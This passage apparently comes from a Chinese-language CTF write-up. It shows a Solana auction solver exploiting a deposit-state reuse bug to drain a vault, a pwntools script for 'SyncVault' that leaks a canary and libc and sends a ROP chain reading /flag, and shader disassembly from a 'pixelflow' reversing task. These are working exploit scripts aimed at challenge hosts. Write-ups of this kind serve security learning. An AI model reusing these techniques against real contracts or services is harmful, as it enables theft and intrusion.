            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::place_bid(cpi_ctx, 11)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, 100)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimRefund {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::claim_refund(cpi_ctx)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimWinner {
                winner: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                auctioneer: ctx.accounts.user.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_winner(cpi_ctx)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CloseAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
            }
        );
        challenge::cpi::close_auction(cpi_ctx)?;
    }
    msg!("Phase 1 Done");
    Ok(())
}

fn phase_2(ctx: &Context<Initialize>) -> Result<()> {
    let now = Clock::get()?.unix_timestamp;
    let end_time_1 = now + 1000; 
    let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; 

    let start_high = 100_000_000_000u64; 
    let buy_now_high = 200_000_000_000u64; 
    let increment_high = 1_000_000_000u64; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::CreateAuction {
                auctioneer: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::create_auction(cpi_ctx, 1338, "Drain".to_string(), buy_now_high, start_high, increment_high, end_time_1, deadline_1)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, start_high)?;
    }

    {
        let seeds = &[b"helper".as_ref(), &[ctx.bumps.pda_bidder]];
        let signer = &[&seeds[..]];
        let cpi_ctx = CpiContext::new_with_signer(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.pda_bidder.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_pda.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            },
            signer
        );
        challenge::cpi::place_bid(cpi_ctx, buy_now_high)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimRefund {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_user.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_refund(cpi_ctx)?;
    }
    msg!("Phase 2 Done");
    Ok(())
}

fn phase_3(ctx: &Context<Initialize>) -> Result<()> {
    let buy_now_admin = 10_000_000_000u64; 

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::PlaceBid {
                bidder: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction_admin.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_admin.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::place_bid(cpi_ctx, buy_now_admin)?;
    }

    {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.challenge.to_account_info(),
            challenge::cpi::accounts::ClaimWinner {
                winner: ctx.accounts.user.to_account_info(),
                auction: ctx.accounts.auction_admin.to_account_info(),
                bidder_state: ctx.accounts.bidder_state_admin.to_account_info(),
                auctioneer: ctx.accounts.admin.to_account_info(),
                vault: ctx.accounts.vault.to_account_info(),
                system_program: ctx.accounts.system_program.to_account_info(),
            }
        );
        challenge::cpi::claim_winner(cpi_ctx)?;
    }
    msg!("Phase 3 Done");
    Ok(())
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub user: Signer<'info>,

    #[account(
        mut, 
        seeds = [b"helper"], 
        bump
    )]
    pub pda_bidder: AccountInfo<'info>,
    
    pub challenge: Program<'info, challenge::program::Challenge>,
    
    #[account(mut)]
    pub auction: AccountInfo<'info>, 
    
    #[account(mut)]
    pub auction_admin: AccountInfo<'info>, 
    
    #[account(mut)]
    pub admin: AccountInfo<'info>,

    #[account(mut)]
    pub bidder_state_user: AccountInfo<'info>, 

    #[account(mut)]
    pub bidder_state_pda: AccountInfo<'info>, 

    #[account(mut)]
    pub bidder_state_admin: AccountInfo<'info>,
    
    #[account(mut)]
    pub vault: AccountInfo<'info>,
    
    pub system_program: Program<'info, System>,
}
```

创建一个自定义拍卖（ID 1338），设置极低的起拍价（0 SOL），此时保证金为 0。玩家参与竞拍。由于保证金为 0，玩家无需支付 SOL，但合约将玩家的 deposit_paid 设为 true 。利用辅助账户（PDA）出价更高并结束该拍卖，或者直接关闭拍卖，保留玩家的 BidderState 状态。

重建 同一个拍卖（ID 1338），但这次设置极高的参数（如起拍价 100 SOL -> 保证金 20 SOL）。玩家再次竞拍。合约检查发现 deposit_paid 已经是 true，因此 跳过 了 20 SOL 的转账检查。利用辅助账户（PDA）出以 10 SOL赢得拍卖，使玩家成为输家。玩家调用 claim_refund 。合约读取当前拍卖的保证金设置（20 SOL），将这笔钱从 Vault 转给玩家。玩家凭空获得了 20 SOL。

此时玩家余额已超过 0.2 SOL。直接参与管理员的拍卖（ID 1），支付保证金。以10 SOL直接赢得拍卖。调用 claim_winner 获取 Flag。

最后修改main.rs获得flag

```Rust
use anchor_lang::{system_program, InstructionData, ToAccountMetas};
use solana_program::pubkey::Pubkey;
use std::net::TcpStream;
use std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::new();
    reader.read_line(&mut line)?;
    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();
    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect("223.6.249.127:14317")?;
    let mut reader = BufReader::new(stream.try_clone().unwrap());

    let mut line = String::new();

    // Check deploy first, then release
    let so_path_deploy = "./solve/target/deploy/solve.so";
    let so_path_release = "./solve/target/release/solve.so";
    
    let so_data = if fs::metadata(so_path_deploy).is_ok() {
        fs::read(so_path_deploy)?
    } else {
        fs::read(so_path_release)?
    };

    reader.read_line(&mut line)?;
    writeln!(stream, "{}", solve::ID)?;
    reader.read_line(&mut line)?;
    writeln!(stream, "{}", so_data.len())?;
    stream.write_all(&so_data)?;

    let chall = Pubkey::from_str(&get_line(&mut reader)?)?;
    let solve = Pubkey::from_str(&get_line(&mut reader)?)?;
    let admin = Pubkey::from_str(&get_line(&mut reader)?)?;
    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
    reader.read_line(&mut line)?;

    println!("");
    println!("chall      : {}", chall);
    println!("solve      : {}", solve);
    println!("admin      : {}", admin);
    println!("user       : {}", user);
    println!("");

    // Derive PDAs
    let auction_id = 1338u64;
    let auction_admin_id = 1u64;
    
    let (pda_bidder, _) = Pubkey::find_program_address(&[b"helper"], &solve);

    let (auction, _) = Pubkey::find_program_address(
        &[b"auction", user.as_ref(), &auction_id.to_le_bytes()],
        &chall,
    );
    let (auction_admin, _) = Pubkey::find_program_address(
        &[b"auction", admin.as_ref(), &auction_admin_id.to_le_bytes()],
        &chall,
    );
    let (vault, _) = Pubkey::find_program_address(
        &[b"vault"],
        &chall,
    );
    let (bidder_state_user, _) = Pubkey::find_program_address(
        &[b"bidder", auction.as_ref(), user.as_ref()],
        &chall,
    );
    let (bidder_state_pda, _) = Pubkey::find_program_address(
        &[b"bidder", auction.as_ref(), pda_bidder.as_ref()],
        &chall,
    );
    let (bidder_state_admin, _) = Pubkey::find_program_address(
        &[b"bidder", auction_admin.as_ref(), user.as_ref()],
        &chall,
    );

    println!("pda_bidder  : {}", pda_bidder);
    println!("auction     : {}", auction);
    println!("auction_admin: {}", auction_admin);
    println!("vault       : {}", vault);
    println!("bidder_state_user: {}", bidder_state_user);
    println!("bidder_state_pda : {}", bidder_state_pda);
    println!("bidder_state_admin: {}", bidder_state_admin);
    println!("");

    {
        let ix = solve::instruction::Initialize {};
        let data = ix.data();
        let ix_accounts = solve::accounts::Initialize {
            user,
            pda_bidder,
            challenge: chall,
            auction,
            auction_admin,
            admin,
            bidder_state_user,
            bidder_state_pda,
            bidder_state_admin,
            vault,
            system_program: system_program::ID,
        };

        let metas = ix_accounts.to_account_metas(None);

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", metas.len())?;
        for meta in metas {
            let mut meta_str = String::new();
            meta_str.push('m');
            if meta.is_writable {
                meta_str.push('w');
            }
            if meta.is_signer {
                meta_str.push('s');
            }
            meta_str.push(' ');
            meta_str.push_str(&meta.pubkey.to_string());
            writeln!(stream, "{}", meta_str)?;
            stream.flush()?;
        }

        reader.read_line(&mut line)?;
        writeln!(stream, "{}", data.len())?;
        stream.write_all(&data)?;

        stream.flush()?;
    }

    line.clear();
    while reader.read_line(&mut line)? != 0 {
        print!("{}", line);
        line.clear();
    }

    Ok(())
}
```

# Pwn

## SyncVault

```Python
from pwn import *

s    = lambda   x : io.send(x)
sl   = lambda   x : io.sendline(x)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = '127.0.0.1 10000'.replace(' ',':')
attack = '223.6.249.127:56463'.replace(' ',':')
binary = './pwn'

context(arch='amd64', log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))
#io = process(binary)
gs = '''
'''
#pay = flat({
#},filler=b'\x00')
#gdb.attach(io,gdbscript=gs)
def set_size(iot,size):
    pay  = 'SET '
    pay += str(size)
    iot.sendline(pay)

def set_head(iot,n):
    pay  = 'SETHEAD '
    pay += str(n)
    iot.sendline(pay)

def set_body(iot,n):
    pay  = 'SETBODY '
    pay += str(n)
    iot.sendline(pay)

def set_sync(iot,n):
    pay  = 'SETSYNC '
    pay += str(n)
    iot.sendline(pay)

def echo(iot,data):
    pay  = 'ECHO'
    iot.sendline(pay)
    iot.sendline(data)

def snaphot(iot):
    pay = 'SNAPSHOT'
    iot.sendline(pay)

def diag(iot):
    pay = 'DIAG'
    iot.sendline(pay)

def sync(iot):
    pay = 'SYNC'
    iot.sendline(pay)

def backup(iot):
    pay = 'QUEUE BACKUP'
    iot.sendline(pay)

def export(iot):
    pay = 'QUEUE EXPORT'
    iot.sendline(pay)

def health(iot):
    pay = 'QUEUE HEALTH'
    iot.sendline(pay)

def show_tasks(iot):
    pay = 'SHOW TASKS'
    iot.sendline(pay)

def show_logs(iot):
    pay = 'SHOW LOGS'
    iot.sendline(pay)

def tick(iot):
    pay = 'TICK'
    iot.sendline(pay)

def get_tid(iot, offset):
    set_sync(iot, 56)
    sync(iot)
    pay = b'A' * 0x30 + p64(offset)
    iot.send(pay)
    iot.recvuntil('TID=')
    tid = int(iot.recvline())
    print(hex(tid))
    return tid

p1 = remote(*attack.split(':')) # body
p2 = remote(*attack.split(':')) # head
p3 = remote(*attack.split(':'))
p4 = remote(*attack.split(':'))

# set head = 0x40000000
tid = get_tid(p1,0x10)
set_body(p1,tid)
p1.close()

# set body = 0x40000000
tid = get_tid(p2,0x18)
set_head(p2,tid)
p2.close()

#pause()

# set size = 0x40000000
tid = get_tid(p4,0x20)
set_size(p4,tid)
p4.close()

p5 = remote(*attack.split(':'))
snaphot(p3)

leak = p3.recv(0xec0)
print(hexdump(leak))
canary = uu64(leak[0x408:0x408+8])
libc_base = uu64(leak[0xeb8:0xeb8+8]) - 0x60d88
lss('canary')
lss('libc_base')
p3.close()

libc = ELF('./libc.so.6')
libc.address = libc_base
libc_rop = ROP(libc)
rax = libc_rop.find_gadget(['pop rax','ret'])[0]
rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]
rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]
rdx = libc_base + 0x00000000000b503c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
syscall = libc_rop.find_gadget(['syscall','ret'])[0]
mov_ = libc_base + 0x000000000013b991 # mov qword ptr [rsi], rdi ; ret
flag = libc.sym['_IO_2_1_stdin_']
rop  = b''
rop += p64(rdi)
rop += b'/flag'.ljust(0x8,b'\x00')
rop += p64(rsi)
rop += p64(flag)
rop += p64(mov_)
m = 5
rop += p64(rdx) + p64(0)*m + p64(rax) + p64(2) + p64(rdi) + p64(flag) + p64(rsi) + p64(0) +  p64(syscall)
rop += p64(rdi) + p64(7) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x100)*m + p64(libc.sym['read'])
rop += p64(rdi) + p64(4) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x100)*m + p64(libc.sym['write'])

pay  = 0x400 * b'A'
pay += p64(canary) * 7
pay += rop

flag = remote(*attack.split(':'))
echo(p5,pay) # overflow
p5.close()
#p5.shutdown('send')
flag.interactive()
```

# Reverse

## pixelflow

用Il2CppDumperr给GameAssembly.dll恢复符号，函数主逻辑在状态机Controller__Check_d__18__MoveNext

```Rust
void Controller__Check_d__18__MoveNext(Controller__Check_d__18_o *this, const MethodInfo *method)
{
if ( !byte_180F4C9B1 )
  {
    sub_180157800(
      &Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter_byte_____Controller__Check_d__18___,
      method);
    sub_180157800(
      &Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter__Controller__Check_d__18___,
      v3);
    sub_180157800(&Method_Controller__Check_b__18_0__, v4);
    sub_180157800(&Method_Controller__Check_b__18_1__, v5);
    sub_180157800(&Method_Controller__Check_b__18_2__, v6);
    sub_180157800(&Method_Controller__Check_b__18_3__, v7);
    sub_180157800(&System_Func_Task__TypeInfo, v8);
    sub_180157800(&System_Func_Task_byte_____TypeInfo, v9);
    sub_180157800(&System_Func_byte____Task__TypeInfo, v10);
    sub_180157800(&int___TypeInfo, v11);
    sub_180157800(&Method_System_Runtime_CompilerServices_TaskAwaiter_byte____GetResult__, v12);
    sub_180157800(&Method_System_Runtime_CompilerServices_TaskAwaiter_byte____get_IsCompleted__, v13);
    sub_180157800(&Method_System_Threading_Tasks_Task_byte____GetAwaiter__, v14);
    byte_180F4C9B1 = 1;
  }
  *(_QWORD *)&awaiter_.fields.m_continueOnCapturedContext = 0;
  awaiter_.fields.m_task = 0;
  __4__this = (Il2CppObject *)this->fields.__4__this;
  switch ( this->fields.__1__state )
  {
    case 0:
      *(_QWORD *)&awaiter_.fields.m_continueOnCapturedContext = this->fields.__u__1.fields.m_task;
      this->fields.__u__1.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_13;
    case 1:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_17;
    case 2:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_20;
    case 3:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_23;
    case 4:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_26;
    case 5:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_29;
  
}
```

状态机的加密逻辑很清晰，从case0到case5依次：

case0：调用Controller___Check_b__18_0_d()：从输入框取字符串，解析出{}包裹的 16 字节 bytes case1：await Controller___Check_b__18_1_d：把这 16 字节写到一张 16×1 的纹理里 case2-case4：await Controller___Check_b__18_2_d连续跑三轮，调用 compute shader 的 kernel K0进行加密 case5：await Controller___Check_b__18_3_d：调用 kernel K1进行逐字节比对，失败写 SharedState 最后 UI 逻辑用 kernel K2 根据 SharedState 显示 Correct/Wrong

使用AssetRipper提取得到资源文件shader.assets，提取K0 K1 K2三个dxbc。提取后用dxdec反编译得到三个kernel的汇编代码：

K0:

```Java
cs_5_0
dcl_globalFlags refactoringAllowed
dcl_resource_texture2d (float,float,float,float) t0
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_temps 5
dcl_indexableTemp x0[16], 4
dcl_indexableTemp x1[32], 4
dcl_thread_group 1, 1, 1
mov x1[0].x, l(0)
mov x1[1].x, l(0)
mov x1[2].x, l(0)
mov x1[3].x, l(0)
mov x1[4].x, l(0)
mov x1[5].x, l(0)
mov x1[6].x, l(0)
mov x1[7].x, l(0)
mov x1[8].x, l(0)
mov x1[9].x, l(0)
mov x1[10].x, l(0)
mov x1[11].x, l(0)
mov x1[12].x, l(0)
mov x1[13].x, l(0)
mov x1[14].x, l(0)
mov x1[15].x, l(0)
mov x1[16].x, l(0)
mov x1[17].x, l(0)
mov x1[18].x, l(0)
mov x1[19].x, l(0)
mov x1[20].x, l(0)
mov x1[21].x, l(0)
mov x1[22].x, l(0)
mov x1[23].x, l(0)
mov x1[24].x, l(0)
mov x1[25].x, l(0)
mov x1[26].x, l(0)
mov x1[27].x, l(0)
mov x1[28].x, l(0)
mov x1[29].x, l(0)
mov x1[30].x, l(0)
mov x1[31].x, l(0)
mov x0[0].x, l(0)
mov x0[1].x, l(0)
mov x0[2].x, l(0)
mov x0[3].x, l(0)
mov x0[4].x, l(0)
mov x0[5].x, l(0)
mov x0[6].x, l(0)
mov x0[7].x, l(0)
mov x0[8].x, l(0)
mov x0[9].x, l(0)
mov x0[10].x, l(0)
mov x0[11].x, l(0)
mov x0[12].x, l(0)
mov x0[13].x, l(0)
mov x0[14].x, l(0)
mov x0[15].x, l(0)
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.x, l(0), t0.xyzw
mov r1.yzw, l(0,0,0,0)
mov r2.yz, l(0,0,-1,0)
mov r3.xz, l(0,0,0,0)
mov r0.yz, l(0,0,0,0)
loop 
  uge r0.w, r0.z, l(1024)
  breakc_nz r0.w
  uge r0.w, r3.x, r0.x
  or r0.w, r0.w, r3.z
  if_nz r0.w
    break 
  endif 
  mov r2.x, r3.x
  ld_indexable(texture2d)(float,float,float,float) r4.xyzw, r2.xyyy, t0.xyzw
  mul r4.xyzw, r4.xyzw, l(255, 255, 255, 255)
  ftou r4.xyzw, r4.xyzw
  switch r4.x
    case l(0)
    mov x1[r4.y + 0].x, r4.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(1)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r0.w, l(15)
    ld_uav_typed_indexable(texture2d)(float,float,float,float) r0.w, r1.xyzw, u0.yzwx
    mul r0.w, r0.w, l(255)
    round_ne r0.w, r0.w
    ftou r0.w, r0.w
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(2)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    xor r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(3)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    and r1.x, r1.x, l(7)
    and r2.w, r0.w, l(255)
    bfi r0.w, l(8), r1.x, r0.w, l(0)
    iadd r1.x, -r1.x, l(8)
    ushr r1.x, r2.w, r1.x
    or r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(4)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r4.w, l(255)
    imul null, r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(5)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r4.w, l(255)
    iadd r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(6)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    iadd r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(7)
    mov r0.w, x1[r4.y + 0].x
    and r0.w, r0.w, l(15)
    mov r1.x, x1[r4.z + 0].x
    and r1.x, r1.x, l(255)
    mov x0[r0.w + 0].x, r1.x
    iadd r3.x, r3.x, l(1)
    break 
    case l(8)
    mov r0.w, x1[r4.y + 0].x
    and r1.x, r4.w, l(255)
    ult r0.y, r0.w, r1.x
    iadd r3.x, r3.x, l(1)
    break 
    case l(9)
    and r0.w, r4.w, l(128)
    iadd r1.x, r4.w, l(-256)
    movc r0.w, r0.w, r1.x, r4.w
    iadd r3.y, r0.w, r3.x
    ilt r0.w, r3.y, l(0)
    ige r1.x, r3.y, r0.x
    or r0.w, r0.w, r1.x
    movc r2.xw, r0.wwww, r2.xxxz, r3.yyyz
    iadd r3.x, r3.x, l(1)
    movc r3.xz, r0.yyyy, r2.xxwx, r3.xxzx
    break 
    default 
    mov r3.z, l(-1)
    break 
  endswitch 
  iadd r0.z, r0.z, l(1)
endloop 
mov r0.x, x0[0].x
mov r0.y, x0[1].x
mov r0.z, x0[2].x
mov r0.w, x0[3].x
mov r1.x, x0[4].x
mov r1.y, x0[5].x
mov r1.z, x0[6].x
mov r1.w, x0[7].x
mov r2.x, x0[8].x
mov r2.y, x0[9].x
mov r2.z, x0[10].x
mov r2.w, x0[11].x
mov r3.x, x0[12].x
mov r3.y, x0[13].x
mov r3.z, x0[14].x
mov r3.w, x0[15].x
utof r0.x, r0.x
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(0, 0, 0, 0), r4.xyzw
utof r0.x, r0.y
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(1, 0, 0, 0), r4.xyzw
utof r0.x, r0.z
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(2, 0, 0, 0), r4.xyzw
utof r0.x, r0.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(3, 0, 0, 0), r0.xyzw
utof r0.x, r1.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(4, 0, 0, 0), r0.xyzw
utof r0.x, r1.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(5, 0, 0, 0), r0.xyzw
utof r0.x, r1.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(6, 0, 0, 0), r0.xyzw
utof r0.x, r1.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(7, 0, 0, 0), r0.xyzw
utof r0.x, r2.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(8, 0, 0, 0), r0.xyzw
utof r0.x, r2.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(9, 0, 0, 0), r0.xyzw
utof r0.x, r2.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(10, 0, 0, 0), r0.xyzw
utof r0.x, r2.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(11, 0, 0, 0), r0.xyzw
utof r0.x, r3.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(12, 0, 0, 0), r0.xyzw
utof r0.x, r3.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(13, 0, 0, 0), r0.xyzw
utof r0.x, r3.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(14, 0, 0, 0), r0.xyzw
utof r0.x, r3.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(15, 0, 0, 0), r0.xyzw
ret 
```

K1:

```Java
cs_5_0
dcl_globalFlags refactoringAllowed
dcl_resource_texture2d (float,float,float,float) t0
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_uav_structured u1, 4
dcl_input vThreadID.x
dcl_temps 2
dcl_thread_group 16, 1, 1
mov r0.x, vThreadID.x
mov r0.yzw, l(0,0,0,0)
ld_uav_typed_indexable(texture2d)(float,float,float,float) r1.x, r0.xwww, u0.xyzw
mul r1.x, r1.x, l(255)
round_ne r1.x, r1.x
ftou r1.x, r1.x
and r1.x, r1.x, l(255)
iadd r1.x, r1.x, vThreadID.x
and r1.x, r1.x, l(255)
ld_indexable(texture2d)(float,float,float,float) r0.x, r0.xyzw, t0.xyzw
mul r0.x, r0.x, l(255)
round_ne r0.x, r0.x
ftou r0.x, r0.x
and r0.x, r0.x, l(255)
ine r0.x, r0.x, r1.x
if_nz r0.x
  store_structured u1.x, l(0), l(0), l(1)
endif 
ret 
```

K2:

```Java
dcl_globalFlags refactoringAllowed
dcl_constantbuffer CB0[2], immediateIndexed
dcl_sampler s0, mode_default
dcl_resource_texture2d (float,float,float,float) t0
dcl_resource_texture2d (float,float,float,float) t1
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_uav_structured u1, 4
dcl_input vThreadID.xy
dcl_temps 4
dcl_thread_group 8, 8, 1
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.xy, l(0), u0.xyzw
uge r0.zw, vThreadID.xxxy, r0.xxxy
or r0.z, r0.w, r0.z
if_nz r0.z
  ret 
endif 
utof r0.zw, vThreadID.yyyx
utof r0.xy, r0.yxyy
div r0.xy, r0.zwzz, r0.xyxx
mad r0.xy, r0.xyxx, cb0[0].wzww, l(-0.5, -0.5, 0, 0)
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.zw, l(0), t0.zwxy
utof r0.zw, r0.wwwz
div r0.z, r0.z, r0.w
sincos r1.x, r2.x, cb0[1].x
mul r1.xy, r0.xyxx, r1.xxxx
mad r3.x, r0.y, r2.x, -r1.x
mad r0.y, r0.x, r2.x, r1.y
div r3.y, r0.y, r0.z
add r0.yz, r3.xxyx, l(0, 0.5, 0.5, 0)
ld_structured_indexable(structured_buffer, stride=4)(mixed,mixed,mixed,mixed) r0.w, l(0), l(0), u1.xxxx
ieq r1.x, r0.w, l(1)
if_z r0.w
  mad r1.yz, cb0[0].xxyx, cb0[1].yyyy, r0.yyzy
  sample_l_indexable(texture2d)(float,float,float,float) r2.xyzw, r1.yzyy, t0.xyzw, s0, l(0)
else 
  mov r2.xyzw, l(0,0,0,1)
endif 
if_nz r1.x
